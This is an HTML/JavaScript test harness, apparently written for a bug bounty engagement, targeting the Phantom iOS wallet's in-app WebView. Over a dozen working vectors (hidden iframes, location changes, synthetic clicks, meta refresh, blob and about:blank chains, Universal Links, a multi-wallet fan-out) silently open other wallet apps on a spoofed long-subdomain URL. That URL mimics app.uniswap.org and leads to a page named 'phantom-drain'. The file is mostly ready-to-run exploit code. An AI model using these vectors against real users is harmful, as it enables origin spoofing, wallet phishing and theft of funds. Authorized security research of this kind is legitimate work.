@@ -1,0 +1,615 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Phantom iOS — Cross-App Scheme Hijack Test Harness</title>
+<style>
+  :root { color-scheme: dark; }
+  *,*::before,*::after { box-sizing: border-box; }
+  html,body { margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text",Roboto,sans-serif; }
+  body { background:#0b0d12; color:#e6e8ee; padding:16px 14px 60px; -webkit-text-size-adjust:100%; }
+  h1 { font-size:18px; margin:0 0 4px; }
+  .sub { font-size:12px; color:#8892a8; margin-bottom:14px; }
+  .card { background:#141826; border:1px solid #1e2437; border-radius:12px; padding:12px; margin-bottom:12px; }
+  .card h2 { font-size:14px; margin:0 0 6px; color:#e6e8ee; }
+  .card p  { font-size:12px; margin:0 0 10px; color:#a8adba; line-height:1.45; }
+  .row { display:flex; flex-wrap:wrap; gap:6px; }
+  button, .btn {
+    background:#5b6cff; color:#fff; border:0; border-radius:9px;
+    padding:9px 12px; font-size:13px; font-weight:600; cursor:pointer;
+    text-decoration:none; display:inline-block;
+    -webkit-tap-highlight-color: rgba(91,108,255,.3);
+  }
+  button.alt  { background:#253055; }
+  button.warn { background:#b03b5a; }
+  button.ok   { background:#1a7a4a; }
+  .pill { display:inline-block; padding:2px 8px; border-radius:999px; font-size:10px;
+          background:#1e2437; color:#8f9bb7; margin-right:4px; letter-spacing:.3px; }
+  .log {
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    font-size:11px; color:#7f8da8; white-space:pre-wrap; word-break:break-all;
+    background:#0f1220; padding:10px; border-radius:8px;
+    max-height:260px; overflow:auto; border:1px solid #1a1f33;
+    -webkit-overflow-scrolling: touch;
+  }
+  .evidence-on  { border-color:#4ade80 !important; box-shadow:0 0 0 1px #4ade80 inset; }
+  .foot { font-size:11px; color:#6a7293; margin-top:14px; }
+  a { color:#8ab4ff; }
+  code { background:#0f1220; padding:1px 5px; border-radius:4px; font-size:11px; }
+  .result-pass { color:#4ade80; font-weight:600; }
+  .result-fail { color:#f87171; }
+  .result-info { color:#facc15; }
+</style>
+</head>
+<body>
+
+<h1>Phantom iOS — Scheme Hijack Test Harness</h1>
+<div class="sub">
+  <span class="pill">bbp-phantom</span>
+  <span class="pill">authorized</span>
+  <span class="pill">ios-wkwebview</span>
+</div>
+
+<!-- ============================================================ -->
+<div class="card" id="fp-card">
+  <h2>0 - Fingerprint (iOS + Phantom detection)</h2>
+  <p>Detects WKWebView, iOS version, Phantom provider injection, and what objects
+     are on <code>window</code>. Green border = confirmed Phantom.</p>
+  <div class="log" id="fp"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case A - Hidden iframe scheme hop (zero-click)</h2>
+  <p>
+    Creates <code>&lt;iframe src="metamask://dapp/..."&gt;</code> off-screen.
+    On iOS WKWebView, <code>decidePolicyForNavigationAction</code> intercepts
+    non-http schemes and may hand them to <code>UIApplication.open()</code>.
+    If Phantom's navigation delegate doesn't block it, MetaMask opens silently.
+  </p>
+  <div class="row">
+    <button onclick="runCase('A')">Run A</button>
+    <button class="alt" onclick="runCase('A2')">A2: iframe + sandbox</button>
+    <button class="alt" onclick="clearLog('logA')">clear</button>
+  </div>
+  <div class="log" id="logA" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case B - <code>window.location</code> assign (zero-click)</h2>
+  <p>
+    Direct <code>location.href = "metamask://..."</code>. On iOS, this fires
+    <code>decidePolicyForNavigationAction</code> with <code>.other</code> type.
+    Fallback vendors often forget to block this even when iframe is filtered.
+  </p>
+  <div class="row">
+    <button onclick="runCase('B')">Run B</button>
+    <button class="alt" onclick="runCase('B2')">B2: location.assign</button>
+    <button class="alt" onclick="runCase('B3')">B3: location.replace</button>
+    <button class="alt" onclick="clearLog('logB')">clear</button>
+  </div>
+  <div class="log" id="logB" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case C - Synthetic anchor <code>.click()</code></h2>
+  <p>
+    Creates <code>&lt;a href="metamask://..."&gt;</code> and calls
+    <code>a.click()</code>. WKWebView on iOS sometimes treats synthetic clicks
+    as user-initiated (<code>navigationType == .linkActivated</code>), passing
+    through gesture gates that block Cases A/B.
+  </p>
+  <div class="row">
+    <button onclick="runCase('C')">Run C</button>
+    <button class="alt" onclick="runCase('C2')">C2: dispatchEvent</button>
+    <button class="alt" onclick="clearLog('logC')">clear</button>
+  </div>
+  <div class="log" id="logC" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case D - Meta refresh redirect</h2>
+  <p>
+    Injects <code>&lt;meta http-equiv="refresh" content="0;url=metamask://..."&gt;</code>.
+    On WKWebView this creates a <code>.other</code> navigation type, which
+    some apps whitelist because it's how normal page reloads work.
+  </p>
+  <div class="row">
+    <button onclick="runCase('D')">Run D</button>
+    <button class="alt" onclick="clearLog('logD')">clear</button>
+  </div>
+  <div class="log" id="logD" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case E - <code>window.open()</code></h2>
+  <p>
+    <code>window.open("metamask://...", "_blank")</code>. iOS WKWebView fires
+    <code>createWebViewWithConfiguration</code> first, then
+    <code>decidePolicyForNavigationAction</code> in the new webview. Some apps
+    only filter the main webview.
+  </p>
+  <div class="row">
+    <button onclick="runCase('E')">Run E</button>
+    <button class="alt" onclick="runCase('E2')">E2: _self</button>
+    <button class="alt" onclick="clearLog('logE')">clear</button>
+  </div>
+  <div class="log" id="logE" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case F - Form submit with scheme action</h2>
+  <p>
+    <code>&lt;form action="metamask://..."&gt;.submit()</code>. On WKWebView
+    this fires as <code>navigationType: .formSubmitted</code> — a different
+    enum from iframe/.other, so apps that only check <code>.linkActivated</code>
+    and <code>.other</code> miss it.
+  </p>
+  <div class="row">
+    <button onclick="runCase('F')">Run F</button>
+    <button class="alt" onclick="clearLog('logF')">clear</button>
+  </div>
+  <div class="log" id="logF" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case G - iOS Universal Links bypass</h2>
+  <p>
+    Navigates to the MetaMask Universal Link
+    (<code>https://metamask.app.link/dapp/...</code>) instead of the custom
+    scheme. iOS opens Universal Links in the registered app even from WKWebView.
+    This bypasses any <code>metamask://</code> scheme filter.
+  </p>
+  <div class="row">
+    <button onclick="runCase('G')">Run G: iframe</button>
+    <button class="alt" onclick="runCase('G2')">G2: location</button>
+    <button class="alt" onclick="runCase('G3')">G3: anchor</button>
+    <button class="alt" onclick="clearLog('logG')">clear</button>
+  </div>
+  <div class="log" id="logG" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case H - about:blank intermediary chain</h2>
+  <p>
+    Opens <code>about:blank</code> via <code>window.open</code>, then writes
+    a scheme redirect into it. The child window's navigation fires from a
+    blank origin, which some WKWebView delegates skip filtering.
+  </p>
+  <div class="row">
+    <button onclick="runCase('H')">Run H</button>
+    <button class="alt" onclick="clearLog('logH')">clear</button>
+  </div>
+  <div class="log" id="logH" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case I - Blob URL + scheme redirect</h2>
+  <p>
+    Creates a <code>blob:</code> URL containing an auto-redirect to the scheme.
+    Navigates an iframe to the blob. Some WKWebView delegates whitelist
+    <code>blob:</code> origins.
+  </p>
+  <div class="row">
+    <button onclick="runCase('I')">Run I</button>
+    <button class="alt" onclick="clearLog('logI')">clear</button>
+  </div>
+  <div class="log" id="logI" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case J - Delayed timer chain (WKWebView timing)</h2>
+  <p>
+    Some WKWebView apps only enforce scheme blocking during the initial page
+    load (<code>decidePolicyForNavigationAction</code> in the first ~2s).
+    This fires the scheme hop after a 4-second delay via nested
+    <code>setTimeout</code> chains.
+  </p>
+  <div class="row">
+    <button onclick="runCase('J')">Run J</button>
+    <button class="alt" onclick="clearLog('logJ')">clear</button>
+  </div>
+  <div class="log" id="logJ" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case K - Multi-wallet fan-out (iOS schemes)</h2>
+  <p>
+    Fires all iOS-relevant schemes via the best vector from above.
+    Staggered 650ms apart. First installed app wins.
+  </p>
+  <div class="row">
+    <button onclick="runCase('K')">Run K</button>
+    <button class="alt" onclick="clearLog('logK')">clear</button>
+  </div>
+  <div class="log" id="logK" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card">
+  <h2>Case L - Long-Subdomain address bar spoof check</h2>
+  <p>
+    Opens the spoofed landing <b>inside Phantom's own WebView</b> to check
+    if the narrow iOS address bar truncates to <code>app.uniswap.org</code>.
+    Screenshot this for origin-confusion evidence.
+  </p>
+  <div class="row">
+    <a class="btn" id="linkL" href="#">Open spoof URL in-app</a>
+    <button class="alt" onclick="copyL()">copy URL</button>
+  </div>
+  <div class="log" id="logL" style="margin-top:8px"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card" id="ev-card">
+  <h2>Global Evidence Monitor</h2>
+  <p>
+    Hooks <code>visibilitychange</code>, <code>pagehide</code>, <code>blur</code>,
+    and iOS-specific <code>resign</code> events. Any line here = app switched
+    away from Phantom, which is the zero-click proof.
+  </p>
+  <div class="log" id="evidence"></div>
+</div>
+
+<div class="foot">
+  Engagement: Phantom Managed BBP (Bugcrowd, authorized).<br>
+  Target: Phantom iOS App (WKWebView). Test on your own lab device only.
+</div>
+
+<script>
+/* ============================================================
+ * Phantom iOS — cross-app scheme hijack test harness
+ * Target: Phantom iOS App (WKWebView)
+ * Authorized: Phantom Managed BBP on Bugcrowd
+ * Author: 33x
+ * ============================================================ */
+
+/* ---------- spoof URL (Long-Subdomain) ----------------------- */
+var ATTACKER_HOST =
+  "app.uniswap.org" +
+  ".liquidity-rewards-claim-portal-v3-mainnet-eth" +
+  ".ajaone.github.io";
+var SPOOF_URL =
+  "https://" + ATTACKER_HOST +
+  "/testing-repository/test/phantom-drain.html?src=phantom";
+
+/* ---------- iOS scheme targets ------------------------------- */
+/* Custom schemes registered in iOS Info.plist by each wallet     */
+var SCHEME_TARGETS = [
+  { name: "MetaMask",        uri: "metamask://dapp/" + SPOOF_URL },
+  { name: "Trust Wallet",    uri: "trust://open_url?coin_id=60&url=" + encodeURIComponent(SPOOF_URL) },
+  { name: "Rainbow",         uri: "rainbow://open?url=" + encodeURIComponent(SPOOF_URL) },
+  { name: "Coinbase Wallet", uri: "cbwallet://dapp?url=" + encodeURIComponent(SPOOF_URL) },
+  { name: "1inch",           uri: "oneinch://open?url=" + encodeURIComponent(SPOOF_URL) },
+  { name: "Uniswap",         uri: "uniswap://open?url=" + encodeURIComponent(SPOOF_URL) },
+  { name: "Chrome iOS",      uri: "googlechrome://" + SPOOF_URL.replace(/^https?:\/\//, "") },
+  { name: "Telegram",        uri: "tg://resolve?domain=PhantomPocBot&start=hit" }
+];
+
+/* iOS Universal Links (bypass custom-scheme filters entirely)    */
+var ULINK_TARGETS = [
+  { name: "MetaMask ULink",  uri: "https://metamask.app.link/dapp/" + SPOOF_URL.replace(/^https?:\/\//, "") },
+  { name: "Trust ULink",     uri: "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(SPOOF_URL) },
+  { name: "Coinbase ULink",  uri: "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(SPOOF_URL) },
+  { name: "Rainbow ULink",   uri: "https://rnbwapp.com/open?url=" + encodeURIComponent(SPOOF_URL) }
+];
+
+var PRIMARY = SCHEME_TARGETS[0].uri;
+var PRIMARY_ULINK = ULINK_TARGETS[0].uri;
+
+/* ---------- utils -------------------------------------------- */
+function $(id) { return document.getElementById(id); }
+function ts() { return new Date().toISOString().substr(11, 12); }
+function log(id, s) {
+  var el = $(id); if (!el) return;
+  el.textContent += "[" + ts() + "] " + s + "\n";
+  el.scrollTop = el.scrollHeight;
+}
+function clearLog(id) { if ($(id)) $(id).textContent = ""; }
+
+/* ---------- iOS fingerprint ---------------------------------- */
+(function fingerprint() {
+  var ua = navigator.userAgent || "";
+  var isiOS = /iPhone|iPad|iPod/.test(ua);
+  var iosVer = (ua.match(/OS (\d+[_\.]\d+)/) || [])[1] || "?";
+  var isWK = !!window.webkit && !!window.webkit.messageHandlers;
+  var isPhantom = /Phantom/i.test(ua) ||
+                  !!(window.phantom && window.phantom.solana) ||
+                  !!(window.solana && window.solana.isPhantom);
+  var hasSolana   = !!window.solana;
+  var hasEthereum = !!window.ethereum;
+  var hasPhantomObj = !!(window.phantom);
+
+  log("fp", "ua = " + ua);
+  log("fp", "iOS = " + isiOS + " (ver " + iosVer.replace("_", ".") + ")");
+  log("fp", "WKWebView = " + isWK);
+  log("fp", "Phantom detected = " + isPhantom);
+  log("fp", "window.phantom = " + hasPhantomObj);
+  log("fp", "window.solana  = " + hasSolana + (hasSolana ? " (isPhantom=" + !!(window.solana||{}).isPhantom + ")" : ""));
+  log("fp", "window.ethereum = " + hasEthereum);
+  log("fp", "document.hidden = " + document.hidden);
+  log("fp", "screen = " + screen.width + "x" + screen.height + " @" + (window.devicePixelRatio || 1) + "x");
+
+  if (!isiOS) log("fp", "WARNING: not iOS — this harness is optimized for iOS WKWebView");
+  if (isPhantom) $("fp-card").classList.add("evidence-on");
+})();
+
+/* ---------- evidence hooks (iOS-optimized) -------------------- */
+var START = 0;
+function markEvidence(src) {
+  var dt = START ? (Date.now() - START) + "ms" : "(idle)";
+  log("evidence", "APP-SWITCH via " + src + " @ " + dt);
+  $("ev-card").classList.add("evidence-on");
+}
+document.addEventListener("visibilitychange", function () {
+  if (document.hidden) markEvidence("visibilitychange");
+  else log("evidence", "returned to foreground");
+});
+window.addEventListener("pagehide", function () { markEvidence("pagehide"); });
+window.addEventListener("blur",     function () { markEvidence("blur"); });
+/* iOS fires resize on app-switch sometimes */
+var lastW = window.innerWidth;
+window.addEventListener("resize", function () {
+  if (window.innerWidth !== lastW) {
+    lastW = window.innerWidth;
+    log("evidence", "resize event (possible app-switch or PiP)");
+  }
+});
+
+/* ---------- Case L: spoof link ------------------------------- */
+$("linkL").href = SPOOF_URL;
+log("logL", "spoof URL = " + SPOOF_URL);
+log("logL", "expected visible in narrow iOS bar = app.uniswap.org...");
+function copyL() {
+  if (navigator.clipboard) navigator.clipboard.writeText(SPOOF_URL);
+  log("logL", "copied to clipboard");
+}
+window.copyL = copyL;
+
+/* ============================================================
+ * CASE RUNNERS
+ * ============================================================ */
+
+function fireIframe(uri, tag) {
+  var f = document.createElement("iframe");
+  f.style.cssText = "display:none;width:0;height:0;border:0;position:absolute;left:-9999px;";
+  f.src = uri;
+  document.body.appendChild(f);
+  setTimeout(function () { try { f.remove(); } catch(e){} }, 2000);
+  log(tag, "iframe.src = " + uri.slice(0, 90));
+}
+
+function runCase(c) {
+  START = Date.now();
+  var tag = "log" + c.charAt(0);
+  log(tag, "==== Case " + c + " fired ====");
+
+  switch (c) {
+
+  /* ---- A: hidden iframe (custom scheme) --------------------- */
+  case "A":
+    fireIframe(PRIMARY, tag);
+    break;
+
+  /* ---- A2: iframe + sandbox attr (some WKWebView delegates    */
+  /*      skip policy checks for sandboxed frames)               */
+  case "A2": {
+    var f = document.createElement("iframe");
+    f.style.cssText = "display:none;width:0;height:0;border:0;position:absolute;left:-9999px;";
+    f.setAttribute("sandbox", "allow-top-navigation allow-scripts");
+    document.body.appendChild(f);
+    /* Write a redirect inside the sandboxed frame */
+    try {
+      f.contentDocument.open();
+      f.contentDocument.write(
+        '<scr' + 'ipt>top.location="' + PRIMARY + '";</scr' + 'ipt>'
+      );
+      f.contentDocument.close();
+      log(tag, "sandboxed iframe -> top.location = " + PRIMARY.slice(0, 80));
+    } catch (e) {
+      /* cross-origin block — try srcdoc instead */
+      f.srcdoc = '<scr' + 'ipt>top.location="' + PRIMARY + '";</scr' + 'ipt>';
+      log(tag, "sandboxed srcdoc -> top.location = " + PRIMARY.slice(0, 80));
+    }
+    setTimeout(function () { try { f.remove(); } catch(e){} }, 2000);
+    break;
+  }
+
+  /* ---- B: location.href ------------------------------------- */
+  case "B":
+    log(tag, "location.href = " + PRIMARY.slice(0, 80));
+    try { window.location.href = PRIMARY; } catch (e) { log(tag, "err: " + e); }
+    break;
+
+  /* ---- B2: location.assign() -------------------------------- */
+  case "B2":
+    log(tag, "location.assign(" + PRIMARY.slice(0, 70) + ")");
+    try { window.location.assign(PRIMARY); } catch (e) { log(tag, "err: " + e); }
+    break;
+
+  /* ---- B3: location.replace() (no history entry) ------------ */
+  case "B3":
+    log(tag, "location.replace(" + PRIMARY.slice(0, 70) + ")");
+    try { window.location.replace(PRIMARY); } catch (e) { log(tag, "err: " + e); }
+    break;
+
+  /* ---- C: synthetic .click() -------------------------------- */
+  case "C": {
+    var a = document.createElement("a");
+    a.href = PRIMARY; a.rel = "noopener"; a.style.display = "none";
+    document.body.appendChild(a);
+    log(tag, "a.click() -> " + PRIMARY.slice(0, 80));
+    try { a.click(); } catch (e) { log(tag, "err: " + e); }
+    setTimeout(function () { try { a.remove(); } catch(e){} }, 1000);
+    break;
+  }
+
+  /* ---- C2: dispatchEvent (MouseEvent) ----------------------- */
+  case "C2": {
+    var a2 = document.createElement("a");
+    a2.href = PRIMARY; a2.style.display = "none";
+    document.body.appendChild(a2);
+    var ev = new MouseEvent("click", { bubbles: true, cancelable: true, view: window });
+    log(tag, "dispatchEvent(MouseEvent click) -> " + PRIMARY.slice(0, 70));
+    try { a2.dispatchEvent(ev); } catch (e) { log(tag, "err: " + e); }
+    setTimeout(function () { try { a2.remove(); } catch(e){} }, 1000);
+    break;
+  }
+
+  /* ---- D: meta refresh -------------------------------------- */
+  case "D": {
+    var m = document.createElement("meta");
+    m.httpEquiv = "refresh";
+    m.content = "0;url=" + PRIMARY;
+    document.head.appendChild(m);
+    log(tag, "<meta refresh> -> " + PRIMARY.slice(0, 80));
+    break;
+  }
+
+  /* ---- E: window.open _blank -------------------------------- */
+  case "E": {
+    log(tag, "window.open(_blank) -> " + PRIMARY.slice(0, 70));
+    try {
+      var w = window.open(PRIMARY, "_blank");
+      log(tag, "returned: " + (w ? "Window obj" : "null/blocked"));
+    } catch (e) { log(tag, "err: " + e); }
+    break;
+  }
+
+  /* ---- E2: window.open _self -------------------------------- */
+  case "E2": {
+    log(tag, "window.open(_self) -> " + PRIMARY.slice(0, 70));
+    try { window.open(PRIMARY, "_self"); } catch (e) { log(tag, "err: " + e); }
+    break;
+  }
+
+  /* ---- F: form.submit() ------------------------------------- */
+  case "F": {
+    var fm = document.createElement("form");
+    fm.method = "GET"; fm.action = PRIMARY; fm.style.display = "none";
+    document.body.appendChild(fm);
+    log(tag, "form.submit() action=" + PRIMARY.slice(0, 70));
+    try { fm.submit(); } catch (e) { log(tag, "err: " + e); }
+    setTimeout(function () { try { fm.remove(); } catch(e){} }, 2000);
+    break;
+  }
+
+  /* ---- G: Universal Links via iframe ------------------------ */
+  case "G":
+    log(tag, "ULink iframe -> " + PRIMARY_ULINK.slice(0, 90));
+    fireIframe(PRIMARY_ULINK, tag);
+    break;
+
+  /* ---- G2: Universal Links via location --------------------- */
+  case "G2":
+    log(tag, "ULink location.href -> " + PRIMARY_ULINK.slice(0, 80));
+    try { window.location.href = PRIMARY_ULINK; } catch (e) { log(tag, "err: " + e); }
+    break;
+
+  /* ---- G3: Universal Links via anchor ----------------------- */
+  case "G3": {
+    var al = document.createElement("a");
+    al.href = PRIMARY_ULINK; al.style.display = "none";
+    document.body.appendChild(al);
+    log(tag, "ULink a.click() -> " + PRIMARY_ULINK.slice(0, 80));
+    try { al.click(); } catch (e) { log(tag, "err: " + e); }
+    setTimeout(function () { try { al.remove(); } catch(e){} }, 1000);
+    break;
+  }
+
+  /* ---- H: about:blank intermediary -------------------------- */
+  case "H": {
+    log(tag, "opening about:blank child window...");
+    try {
+      var child = window.open("about:blank", "_blank");
+      if (child) {
+        log(tag, "child window opened, injecting redirect...");
+        setTimeout(function () {
+          try {
+            child.document.open();
+            child.document.write(
+              '<!doctype html><html><head>' +
+              '<meta http-equiv="refresh" content="0;url=' + PRIMARY + '">' +
+              '</head><body><scr' + 'ipt>location.href="' + PRIMARY + '";</scr' + 'ipt></body></html>'
+            );
+            child.document.close();
+            log(tag, "redirect injected into about:blank child");
+          } catch (e) { log(tag, "child write err: " + e); }
+        }, 300);
+      } else {
+        log(tag, "window.open blocked (popup blocker)");
+      }
+    } catch (e) { log(tag, "err: " + e); }
+    break;
+  }
+
+  /* ---- I: blob URL + auto-redirect -------------------------- */
+  case "I": {
+    var html = '<!doctype html><html><head>' +
+      '<meta http-equiv="refresh" content="0;url=' + PRIMARY + '">' +
+      '</head><body><scr' + 'ipt>location.href="' + PRIMARY + '";</scr' + 'ipt></body></html>';
+    var blob = new Blob([html], { type: "text/html" });
+    var burl = URL.createObjectURL(blob);
+    log(tag, "blob URL = " + burl.slice(0, 50));
+    fireIframe(burl, tag);
+    /* Also try top-level */
+    setTimeout(function () {
+      log(tag, "blob -> location fallback");
+      try { window.location.href = burl; } catch (e) { log(tag, "err: " + e); }
+    }, 1500);
+    break;
+  }
+
+  /* ---- J: delayed timer chain ------------------------------- */
+  case "J": {
+    log(tag, "starting 4-second timer chain...");
+    setTimeout(function () {
+      log(tag, "2s checkpoint...");
+      setTimeout(function () {
+        log(tag, "4s - firing scheme via iframe");
+        fireIframe(PRIMARY, tag);
+        setTimeout(function () {
+          if (!document.hidden) {
+            log(tag, "4.5s - iframe didn't switch, trying location.href");
+            try { window.location.href = PRIMARY; } catch (e) { log(tag, "err: " + e); }
+          }
+        }, 500);
+      }, 2000);
+    }, 2000);
+    break;
+  }
+
+  /* ---- K: multi-wallet fan-out ------------------------------ */
+  case "K": {
+    var all = SCHEME_TARGETS.concat(ULINK_TARGETS);
+    log(tag, "fanning out " + all.length + " targets (schemes + ULinks)");
+    all.forEach(function (t, i) {
+      setTimeout(function () {
+        log(tag, "  hop " + i + " - " + t.name);
+        fireIframe(t.uri, tag);
+      }, i * 650);
+    });
+    break;
+  }
+
+  default:
+    log(tag, "unknown case: " + c);
+  }
+}
+
+window.runCase = runCase;
+window.clearLog = clearLog;
+</script>
+</body>
+</html>
